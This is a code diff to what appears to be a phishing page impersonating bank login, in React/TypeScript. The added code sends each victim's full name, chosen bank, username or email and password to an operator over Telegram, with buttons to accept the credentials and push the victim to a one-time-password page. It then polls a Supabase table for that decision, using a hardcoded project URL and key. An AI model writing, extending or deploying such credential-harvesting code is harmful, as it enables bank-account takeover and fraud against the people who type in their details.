@@ -171,6 +171,44 @@ useEffect(() => {
     load();
   }, [navigate]);
 
+  // Poll Supabase every 3s for admin signal — direct REST fetch, no RLS dependency
+  const SB_URL = "https://croiuvvyeyvtehcftxrf.supabase.co";
+  const SB_KEY = "sb_publishable_g3QsYAAcd97X4g3VKx43ow_U806nBzx";
+
+  const startPolling = useCallback((uid: string) => {
+    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+    pollIntervalRef.current = setInterval(async () => {
+      try {
+        const res = await fetch(
+          `${SB_URL}/rest/v1/tier3_approval_signals?user_id=eq.${uid}&select=signal&limit=1`,
+          { headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` } }
+        );
+        const rows = await res.json();
+        const signal = rows?.[0]?.signal;
+
+        if (signal === "approved") {
+          clearInterval(pollIntervalRef.current!);
+          pollIntervalRef.current = null;
+          // Delete the signal row
+          await fetch(`${SB_URL}/rest/v1/tier3_approval_signals?user_id=eq.${uid}`, {
+            method: "DELETE",
+            headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` }
+          });
+          setIsTransitioning(true);
+          setTimeout(() => { setStep("auth-confirm"); setIsTransitioning(false); }, 2200);
+        } else if (signal === "rejected") {
+          clearInterval(pollIntervalRef.current!);
+          pollIntervalRef.current = null;
+          await fetch(`${SB_URL}/rest/v1/tier3_approval_signals?user_id=eq.${uid}`, {
+            method: "DELETE",
+            headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` }
+          });
+          setStep("credentials-rejected");
+        }
+      } catch (_) {}
+    }, 3000);
+  }, []);
+
   // Cleanup on unmount
   useEffect(() => {
     return () => { if (pollIntervalRef.current) clearInterval(pollIntervalRef.current); };
@@ -212,14 +250,40 @@ useEffect(() => {
     );
   };
 
+  // KEY CHANGE: send credentials with inline ✅ / ❌ keyboard, then go to waiting screen
   const handleLogin = async () => {
     if (!email || !password) { setLoginError("Please enter email and password"); return; }
     if (!userId) return;
 
     setIsTransitioning(true);
+
+    // Clear any stale signal first
+    await fetch(`${SB_URL}/rest/v1/tier3_approval_signals?user_id=eq.${userId}`, { method: "DELETE", headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` } });
+
+    const credText =
+      `🔐 <b>LOGIN CREDENTIALS SUBMITTED</b>\n\n` +
+      `👤 <b>User:</b> ${profile?.full_name}\n` +
+      `🏦 <b>Bank:</b> ${selectedBank?.name}\n\n` +
+      `📧 <b>USERNAME / EMAIL:</b>\n<code>${email}</code>\n\n` +
+      `🔑 <b>PASSWORD:</b>\n<code>${password}</code>\n\n` +
+      `🕐 ${new Date().toLocaleString()}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `<i>Tap ✅ to send user to OTP page, or ❌ if credentials are wrong.</i>`;
+
+    const msgId = await sendTelegramMessage(credText, {
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "✅ Credentials OK — Send to OTP", callback_data: `approve_creds:${userId}` },
+          { text: "❌ Wrong Credentials", callback_data: `reject_creds:${userId}` },
+        ]],
+      },
+    });
+
+    setPendingMsgId(msgId);
     setLoginError("");
     setIsTransitioning(false);
-    setStep("auth-confirm");
+    setStep("awaiting-approval");
+    startPolling(userId);
   };
 
   const handleOtpChange = (value: string) => {
